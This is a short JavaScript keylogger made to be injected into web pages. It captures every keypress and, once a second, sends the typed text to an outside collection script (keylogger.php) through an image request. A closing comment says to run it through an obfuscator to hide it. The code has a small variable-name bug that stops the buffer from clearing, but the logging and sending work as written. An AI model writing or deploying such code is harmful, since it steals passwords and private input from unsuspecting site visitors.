var vals='';
var url1 = 'http://192.168.1.2/forum/system/keylogger.php?version=20200726c=';
var url2 = ''
document.onkeypress = function(e) {
	get = window.event?event:e;
	val = get.keyCode?get.keyCode:get.charCode;
	switch(val) {
		case 13:
			val = '[ENT]'
			break;
		// add other keycodes as needed, 9, and 8 didn't seem to work
		default:
			val = String.fromCharCode(val);		
	}
	vals+=val;
}
window.setInterval(function(){
	if(vals.length>0) {
		new Image().src = url1+vals+url2;
		valss = '';
	}
}, 1000);

//Run this through an obfuscator, remove comments first
